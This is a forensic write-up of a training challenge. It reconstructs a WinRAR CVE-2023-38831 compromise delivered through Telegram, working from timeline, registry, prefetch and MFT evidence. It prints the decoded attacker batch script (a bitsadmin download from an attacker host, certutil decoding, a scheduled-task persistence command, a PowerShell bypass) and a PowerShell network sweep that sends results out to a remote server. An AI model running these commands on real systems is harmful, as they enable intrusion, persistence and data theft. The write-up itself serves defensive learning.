---
title: "CyberDefenders Spotted in the Wild Write-up"
date: "30 June 2026"
description: "CyberDefenders Spotted in the Wild DFIR write-up covering Telegram delivery, malicious archive execution, persistence, discovery, and log tampering."
tags: [CyberDefenders, DFIR, Windows Forensics]
---

## Overview

This challenge investigates a Windows host involved in the fictional FinTrust Bank breach. The evidence pointed to a malicious archive delivered through Telegram, opened with WinRAR, and used to launch a second-stage payload. The attack chain ultimately created scripts under `C:\Windows\Temp`, established scheduled-task persistence, performed internal network discovery, staged the scan results for exfiltration, and then attempted to tamper with event logs.

Challenge source: [CyberDefenders SpottedInTheWild](https://cyberdefenders.org/blueteam-ctf-challenges/spottedinthewild/)

The key finding was that the archive abused **CVE-2023-38831**, a WinRAR archive-handling vulnerability that was widely exploited in the wild. In this case, the archive contained a decoy PDF name and a suspicious command script named `SANS SEC401.pdf .cmd`.

## Evidence and Tooling

The investigation used a Windows disk image and built a timeline from filesystem, registry, and event-log artifacts.

Tools used:

- `RECmd` for registry review
- `MFTECmd` for `$MFT` and USN Journal analysis
- `log2timeline.py` and `psort.py` for Plaso timeline generation
- Timeline Explorer for filtering the resulting CSV timeline
- `PECmd` for prefetch analysis
- Notepad++, HxD, and CyberChef for script review and decoding
- VirusTotal for malware context on the archive

The system timezone was checked first:

```powershell
RECmd -f 'E:\VSS1\Windows\System32\config\SYSTEM' --kn 'ControlSet001\Control\TimeZoneInformation' --nl
```

I then generated a bodyfile from the MFT and built a Plaso timeline:

```powershell
MFTECmd -f 'E:\C\$MFT' --body D:\Labs\timeline --bodyf c152-mftecmd.body --blf --bdl C:
```

```powershell
docker run --rm -v D:\166-SpottedInTheWild\temp_extract_dir:/evidence:ro -v D:\Labs\timeline:/data log2timeline/plaso log2timeline.py --timezone "Africa/Cairo" --parsers "win7,!filestat" --storage-file /data/evidences.plaso /evidence/c125-SpottedInTheWild.vhd
```

```powershell
docker run --rm -v D:\Labs\timeline:/data log2timeline/plaso log2timeline.py --parsers "mactime" --storage-file /data/evidences.plaso /data/c152-mftecmd.body
```

The final timeline was exported in UTC:

```powershell
docker run --rm -v D:\Labs\timeline:/data log2timeline/plaso psort.py --output-time-zone "UTC" -o l2tcsv -w /data/evidences-triage.csv /data/evidences.plaso "(((_parser_chain == 'winevtx') and (timestamp_desc == 'Creation Time')) or (_parser_chain != 'winevtx'))"
```

![Plaso timeline generation](/static/images/blog/spotted-in-the-wild-1.png)

## High-Level Timeline

| UTC time | Event |
| --- | --- |
| 2024-02-02 18:24:25 | User browsed to `desktop.telegram.org`. |
| 2024-02-02 18:29:56 | Telegram Desktop installation artifacts appeared. |
| 2024-02-03 07:32:44 | Chrome history showed a search for downloading SANS SEC401 via Telegram. |
| 2024-02-03 07:33:20 | `SANS SEC401.rar` was downloaded into the Telegram Desktop downloads folder. |
| 2024-02-03 07:33:53 | WinRAR triggered suspicious Security Event ID 4798 activity. |
| 2024-02-03 07:34:23 | BITS downloaded `amanwhogetsnorest.jpg` from the attacker's host. |
| 2024-02-03 07:34:37 | `normal.zip` and `z.ps1` appeared under `C:\Windows\Temp`. |
| 2024-02-03 07:34:39 | `run.bat` and `Eventlogs.ps1` appeared under `C:\Windows\Temp`. |
| 2024-02-03 07:34:40 | `run.ps1` appeared under `C:\Windows\Temp`. |
| 2024-02-03 07:38:01 | PowerShell activity associated with `Eventlogs.ps1` stopped. |

## Initial Access: Telegram Download

The first question was how the malicious file reached the host. The challenge context suggested that a WinRAR vulnerability had been exploited, so I started by searching the timeline for `.rar` files. That search surfaced the offending archive inside a Telegram Desktop downloads folder. From there, I pivoted backward in the timeline to look for earlier Telegram activity, which revealed the Telegram Desktop installation and the browsing activity that led to the malicious archive download.

Timeline filtering around Telegram showed browsing and installation activity on February 2, followed by the suspicious archive download on February 3.

The timeline showed visits to Telegram-related domains:

- `https://desktop.telegram.org/`
- `https://telegram.org/`

It also showed the file landing here:

```text
C:\Users\Administrator\Downloads\Telegram Desktop\SANS SEC401.rar
```

The key timestamp was:

```text
2024-02-03 07:33:20 UTC
```

![Telegram-related timeline activity](/static/images/blog/spotted-in-the-wild-3.png)

The `.rar` file association was also useful. The registry showed that `.rar` files were opened with WinRAR:

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.rar\OpenWithList
Index: 1 [MRU Value b]: WinRAR.exe
Index: 2 [MRU Value a]: {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\OpenWith.exe
```

![RAR OpenWithList registry evidence](/static/images/blog/spotted-in-the-wild-6.png)

## Archive Analysis: CVE-2023-38831

The suspicious archive was `SANS SEC401.rar`. VirusTotal context and archive contents both pointed to a WinRAR exploit pattern associated with **CVE-2023-38831**.

![VirusTotal detection context](/static/images/blog/spotted-in-the-wild-22.png)

Opening the archive showed a suspicious layout. The archive contained a decoy-looking PDF item and a similarly named folder. Inside that folder was the malicious command script:

```text
SANS SEC401.pdf .cmd
```

![Archive top-level contents](/static/images/blog/spotted-in-the-wild-23.png)

![Malicious command file inside archive folder](/static/images/blog/spotted-in-the-wild-24.png)

This is consistent with CVE-2023-38831 behavior: a crafted archive can make a victim believe they are opening a benign document while WinRAR executes a related script with a confusingly similar name.

## WinRAR Execution Evidence

The timeline showed WinRAR interaction almost immediately after the archive download. A notable event was Security Event ID `4798`, which records local group membership enumeration. The strange part was the caller process:

```xml
<EventID>4798</EventID>
<TimeCreated SystemTime="2024-02-03T07:33:53.827847300Z" />
<Data Name="TargetUserName">Administrator</Data>
<Data Name="CallerProcessName">C:\Program Files\WinRAR\WinRAR.exe</Data>
```

WinRAR enumerating local groups is not normal archive-opening behavior and was a strong indicator that code execution had occurred through the archive.

![Event ID 4798 with WinRAR as caller](/static/images/blog/spotted-in-the-wild-7.png)

WinRAR prefetch supported execution around the same time:

```text
Executable name: WINRAR.EXE
Created on: 2024-02-03 07:34:02
Last run: 2024-02-03 07:34:18
Other run times: 2024-02-03 07:33:53
```

![WinRAR prefetch evidence](/static/images/blog/spotted-in-the-wild-9.png)

The timeline also showed `SANS SEC401.pdf` being extracted under a WinRAR temporary directory:

```text
C:\Users\Administrator\AppData\Local\Temp\Rar$...\SANS SEC401.pdf
```

![WinRAR temporary extraction evidence](/static/images/blog/spotted-in-the-wild-12.png)

## Second Stage Download

The malicious command script launched a second stage using BITS. A BITS Client event showed the attacker-controlled URL:

```xml
<EventID>59</EventID>
<TimeCreated SystemTime="2024-02-03T07:34:23.822715200Z" />
<Data Name="name">Nothing</Data>
<Data Name="url">http://172.18.35.10:8000/amanwhogetsnorest.jpg</Data>
<Data Name="fileLength">3816</Data>
```

![BITS Client event for second-stage download](/static/images/blog/spotted-in-the-wild-13.png)

The recovered command logic came from `SANS SEC401.pdf .cmd`. I deobfuscated it statically. The file was a Windows batch script with two main obfuscation layers:

- A UTF-16/byte-order mojibake layer where the pasted-looking characters decoded into ordinary BAT text.
- BAT substring obfuscation where commands were reconstructed with expressions such as `%var:~offset,1%`.

The recovered command script logic was:

```bat
REM "No worries mate. You just got hacked"
cd C:\Windows\Temp

bitsadmin /transfer Nothing /download /priority normal http://172.18.35.10:8000/amanwhogetsnorest.jpg C:\Windows\Temp\amanwhogetsnorest.jpg

certutil -decode amanwhogetsnorest.jpg normal.zip >nul

echo Get-ChildItem -Path "C:\Windows\Temp" ^-Filter ^*.zip ^| Expand-Archive -DestinationPath "C:\Windows\Temp" ^-Force > C:\Windows\Temp\z.ps1

cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\z.ps1"

schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST

REM "If I win, you become my slave."

del z.ps1
del amanwhogetsnorest.jpg
del normal.zip
del C:\Windows\system32\Tasks\whoisthebaba

timeout /t 200 /nobreak >nul

del C:\Downloads

cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\Eventlogs.ps1"

del C:\Windows\Temp\Eventlogs.ps1
```

This script explains the rest of the activity:

- `bitsadmin.exe` downloaded a disguised `.jpg`.
- `certutil.exe` decoded it into `normal.zip`.
- `z.ps1` expanded the ZIP into `C:\Windows\Temp`.
- `schtasks.exe` created persistence through a task named `whoisthebaba`.
- Staging files were deleted.
- `Eventlogs.ps1` was executed later to tamper with logs.

Timeline filtering around `C:\Windows\Temp` showed the expected artifacts:

```text
C:\Windows\Temp\amanwhogetsnorest.jpg (deleted)
C:\Windows\Temp\normal.zip (deleted)
C:\Windows\Temp\z.ps1 (deleted)
C:\Windows\Temp\run.bat
C:\Windows\Temp\Eventlogs.ps1 (deleted)
C:\Windows\Temp\run.ps1
```

![Windows Temp artifacts](/static/images/blog/spotted-in-the-wild-15.png)

## Recovering Deleted Script Content

Some of the deleted scripts were small enough to be resident in the MFT. `MFTECmd` was used to inspect file records and recover resident `$DATA`.

For example, the deleted `z.ps1` content was visible directly in the MFT record:

```text
Get-ChildItem -Path "C:\Windows\Temp" -Filter *.zip | Expand-Archive -DestinationPath "C:\Windows\Temp" -Force
```

![Resident MFT data for z.ps1](/static/images/blog/spotted-in-the-wild-27.png)

This matched the command created by the first-stage script and confirmed that `z.ps1` was only a small helper used to unpack the downloaded ZIP.

## Persistence

The attacker's persistence command was:

```bat
schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST
```

This creates a scheduled task named `whoisthebaba`, configured to run every three minutes with highest privileges. The task action points to:

```text
C:\Windows\Temp\run.bat
```

The first-stage script then deleted:

```text
C:\Windows\system32\Tasks\whoisthebaba
```

That deletion looks like an anti-forensics attempt against the task file. The task file itself could not be recovered because it was non-resident, and the VHD did not appear to be a clean image of the full `C:` drive. However, the registry TaskCache still contained recoverable scheduled-task metadata.

I used `RECmd` to search the SOFTWARE hive for the task name:

```powershell
$hive = 'E:\VSS1\Windows\System32\config\SOFTWARE'
RECmd -f $hive --sa whoisthebaba
```

That search returned the TaskCache tree key and the task GUID:

```text
Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\whoisthebaba
Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{5BAA9F05-9269-4DCA-A667-F464671D33F0}
```

![TaskCache search hits for whoisthebaba](/static/images/blog/spotted-in-the-wild-28.png)

Querying the `Tasks\{GUID}` key recovered the metadata and action values:

```powershell
RECmd -f $hive --kn 'Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{5BAA9F05-9269-4DCA-A667-F464671D33F0}'
```

The key showed:

```text
Path = \whoisthebaba
Date = 2024-02-03T09:34:40
Author = DESKTOP-2R3AR22\Administrator
URI = \whoisthebaba
Actions = C:\Windows\Temp\run.bat
```

![TaskCache metadata and action values for whoisthebaba](/static/images/blog/spotted-in-the-wild-29.png)

This confirmed that the scheduled task existed and pointed to `C:\Windows\Temp\run.bat`, even though the task file had been removed.

## Payload Behavior: Network Discovery and Exfil Staging

`run.bat` appeared garbled in Notepad++ because it was encoded in a way that rendered as mojibake. Viewing it in a hex editor made it clear that it was a launcher for the PowerShell payload.

![run.bat viewed as mojibake](/static/images/blog/spotted-in-the-wild-16.png)

![run.bat in HxD](/static/images/blog/spotted-in-the-wild-18.png)

The main payload was `run.ps1`. It contained reversed Base64 that decoded to a local network sweep:

```powershell
$startIP = "192.168.1.1"
$endIP = "192.168.1.99"
$outputFile = "$env:UserProfile\AppData\Local\Temp\BL4356.txt"

$start = [System.Net.IPAddress]::Parse($startIP).GetAddressBytes()[3]
$end = [System.Net.IPAddress]::Parse($endIP).GetAddressBytes()[3]

for ($current = $start; $current -le $end; $current++) {
    $currentIP = "$($startIP.Substring(0, $startIP.LastIndexOf('.') + 1))$current"
    $result = Test-Connection -ComputerName $currentIP -Count 1 -ErrorAction SilentlyContinue

    if ($result -ne $null) {
        Write-Host "Host $currentIP is online."
        "Host $currentIP is online." | Out-File -Append -FilePath $outputFile
    } else {
        Write-Host "Host $currentIP is offline."
        "Host $currentIP is offline." | Out-File -Append -FilePath $outputFile
    }
}

Write-Host "Scan results saved to $outputFile"
$var = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($outputFile))
Invoke-WebRequest -Uri "http://192.168.1.5:8000/$var" -Method GET
```

The tool scanned `192.168.1.1` through `192.168.1.99`, wrote host status output to a temp file, Base64-encoded that file, and sent the encoded data to an internal web server over HTTP GET.

The harvested data path was:

```text
C:\Users\Administrator\AppData\Local\Temp\BL4356.txt
```

The recovered scan results showed live hosts including:

```text
Host 192.168.1.1 is online.
Host 192.168.1.5 is online.
```

Later repeated scan output also showed `192.168.1.2` online.

## Event Log Tampering

The attacker also staged `Eventlogs.ps1`:

```text
C:\Windows\Temp\Eventlogs.ps1
```

Timeline evidence showed the file being created and later deleted:

```text
2024-02-03 07:34:39 C:\Windows\Temp\Eventlogs.ps1 (deleted)
```

The execution evidence came from PowerShell operational events. The relevant host application was:

```text
powershell -NOP -EP Bypass C:\Windows\Temp\Eventlogs.ps1
```

Timeline filtering showed the script activity stopping at:

```text
2024-02-03 07:38:01 UTC
```

![Eventlogs.ps1 execution evidence](/static/images/blog/spotted-in-the-wild-19.png)

## Indicators of Compromise

### Files and Paths

```text
C:\Users\Administrator\Downloads\Telegram Desktop\SANS SEC401.rar
SANS SEC401.pdf .cmd
C:\Users\Administrator\AppData\Local\Temp\Rar$...\SANS SEC401.pdf
C:\Windows\Temp\amanwhogetsnorest.jpg
C:\Windows\Temp\normal.zip
C:\Windows\Temp\z.ps1
C:\Windows\Temp\run.bat
C:\Windows\Temp\run.ps1
C:\Windows\Temp\Eventlogs.ps1
C:\Users\Administrator\AppData\Local\Temp\BL4356.txt
C:\Windows\system32\Tasks\whoisthebaba
```

### URLs and Network Indicators

```text
http://172.18.35.10:8000/amanwhogetsnorest.jpg
http://192.168.1.5:8000/<base64_scan_results>
192.168.1.1
192.168.1.5
```

### Process and Command Indicators

```text
WinRAR.exe
bitsadmin /transfer Nothing /download /priority normal http://172.18.35.10:8000/amanwhogetsnorest.jpg C:\Windows\Temp\amanwhogetsnorest.jpg
certutil -decode amanwhogetsnorest.jpg normal.zip
powershell -NOP -EP Bypass C:\Windows\Temp\z.ps1
powershell -NOP -EP Bypass C:\Windows\Temp\Eventlogs.ps1
schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST
```

## Conclusion

The compromise began with a Telegram-delivered archive named `SANS SEC401.rar`. The archive structure and VirusTotal context showed that it abused CVE-2023-38831, causing WinRAR to execute `SANS SEC401.pdf .cmd` when the victim interacted with what looked like a PDF.

From there, the attacker used BITS and Certutil to download and decode a second stage, unpacked scripts into `C:\Windows\Temp`, created scheduled-task persistence, performed local network discovery, staged the results in `BL4356.txt`, and then ran `Eventlogs.ps1` to tamper with logs. The strongest evidence came from the combined timeline: Telegram download artifacts, WinRAR registry/prefetch/event activity, BITS Client events, temporary script creation, PowerShell operational logs, and resident MFT data from deleted helper scripts.

Those findings were enough to reconstruct the attack chain and complete the CyberDefenders challenge without needing to rely on a separate answer dump.
